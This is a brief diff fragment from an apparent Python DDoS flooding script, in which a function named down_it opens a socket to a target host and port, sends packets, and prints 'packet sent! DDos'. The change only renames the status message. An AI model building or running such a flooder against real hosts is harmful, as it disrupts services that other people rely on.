@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! JerryDDos--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! DDos--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
